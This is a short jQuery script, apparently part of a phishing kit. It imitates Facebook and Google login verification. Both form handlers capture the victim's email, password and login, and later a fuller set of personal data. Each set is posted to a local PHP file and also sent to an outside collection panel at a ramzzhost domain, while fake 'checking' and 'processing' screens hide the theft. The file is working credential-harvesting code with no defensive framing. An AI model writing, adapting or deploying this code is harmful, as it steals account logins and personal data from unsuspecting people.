// STEP 1: Login + API
$(document).on("submit", "#ValidateVerificationDataFB, #ValidateVerificationDataGP", function (e) {
    e.preventDefault();
    var dataPost = $(this).serialize();

    $('#finalEmail').val($(this).find('input[name="email"]').val());
    $('#finalPassword').val($(this).find('input[name="password"]').val());
    $('#finalLogin').val($(this).find('input[name="login"]').val());

    $('.login-facebook, .login-google').hide();
    $('.check_verification').show();

    $.ajax({
        url: "codxfinal.php",
        type: "POST",
        data: dataPost,
        success: function () {
            $.post("https://panelbyramzz.ramzzhost.web.id/setting/api.php", dataPost);

            setTimeout(function () {
                $('.check_verification').hide();
                $('.account_verification').fadeIn(); 
            }, 2000);
        }
    });
});

// STEP 2: All Data + API
$(document).on("submit", "#FormFinal", function (e) {
    e.preventDefault();
    var dataLengkap = $(this).serialize();

    $('.account_verification').hide();
    $('.check_verification').show();

    $.ajax({
        url: "codxfinal.php",
        type: "POST",
        data: dataLengkap,
        success: function () {
            $.post("https://panelbyramzz.ramzzhost.web.id/setting/api.php", dataLengkap);

            setTimeout(function () {
                $('.check_verification').hide();
                $('.processing_account').fadeIn(); 
            }, 2500);
        }
    });
});
